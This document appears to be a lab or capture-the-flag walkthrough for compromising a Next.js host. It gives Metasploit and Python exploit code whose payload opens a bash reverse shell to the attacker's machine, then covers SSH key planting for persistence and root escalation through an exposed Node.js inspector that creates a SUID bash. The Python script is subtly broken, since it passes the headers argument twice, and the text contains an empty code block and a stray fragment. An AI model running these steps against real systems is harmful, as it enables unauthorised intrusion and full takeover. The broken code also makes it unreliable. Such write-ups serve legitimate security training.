# Foothold
## CVE-2025-55182 — Next.js React Server Actions Unauthenticated RCE

**Vulnerability:** Next.js ≤ 15.2.2 handles React Server Actions through a special code path activated when `bodySizeLimit` is configured. This path processes `multipart/form-data` requests identified by the `Next-Action` header before running authentication middleware. An attacker who can enumerate a valid action hash from the client-side JS bundles can invoke any server action — including privileged diagnostic ones — without authentication.

**Exploiting with Metasploit:**

```
msf6 > use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
msf6 exploit(...) > set RHOSTS 10.129.5.13
msf6 exploit(...) > set RPORT 3000
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > run
```

**Manual exploit** — extracting the action hash from Next.js bundles and crafting the request directly:

```bash
# Extract action hash from client bundles
curl -s "http://10.129.5.13:3000/_next/static/chunks/app/api/admin/diagnostics/route.js" \
  | grep -oP '"[a-f0-9]{40}"' | head -1
```

```python
import requests

TARGET = "http://10.129.5.13:3000"
LHOST, LPORT = "10.10.16.152", 4444
ACTION_HASH = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"
CMD = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

requests.post(
    f"{TARGET}/api/admin/diagnostics",
    headers={"Next-Action": ACTION_HASH},
    data=f'--b\r\nContent-Disposition: form-data; name="1"\r\n\r\n["{CMD}"]\r\n--b--\r\n',
    headers={"Next-Action": ACTION_HASH,
             "Content-Type": "multipart/form-data; boundary=b"}
)
```

Upgrading to a proper PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```


```javascript

```

The classic production mistake.

## SSH Key Drop

The `node` account has `/usr/sbin/nologin` as its shell, so interactive SSH sessions close immediately after printing the MOTD. However, SSH still works for port forwarding with the `-N` flag.

```bash
mkdir -p /home/node/.ssh && chmod 700 /home/node/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKYl0YvQQDjM6SR32WyqoG2w397byGFEQg02He+czzI kali@kali" \
  >> /home/node/.ssh/authorized_keys
chmod 600 /home/node/.ssh/authorized_keys
```

## Port Forwarding to Node.js Inspector

```bash
# Kali — forward localhost:9229 on the target to localhost:9229 locally
ssh -i ~/.ssh/id_ed25519 \
    -L 9229:127.0.0.1:9229 \
    -N node@10.129.5.13
```

## Executing Arbitrary JS as root via Inspector

**How the inspector works:** The Chrome DevTools Protocol inspector accepts WebSocket connections and exposes a REPL that can evaluate JavaScript in the V8 runtime of the target process. No authentication. Full access to all Node.js built-in modules including `child_process`.

```bash
node inspect 127.0.0.1:9229
```

```
connecting to 127.0.0.1:9229 ... ok
Break on start in /opt/uptime-monitor/worker.js:1
> 1 // Uptime monitor — checks internal services every 30s
debug>
```

We're now in the debug REPL executing as root. Creating a SUID bash:

```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash').toString()")
```

```
debug> .exit
```

| Step | Vulnerability | Impact |
|------|--------------|--------|
| Initial access | CVE-2025-55182 Next.js Server Actions bodySizeLimit bypass | RCE as `node` |
| Privilege escalation | Node.js `--inspect` on localhost, running as root | Arbitrary JS execution → full root |

**Key takeaway:** The `--inspect` flag must never be used on processes running with elevated privileges, and must always be removed before production deployment. The inspector accepts connections without authentication — any user able to reach the port gains full control of the process.
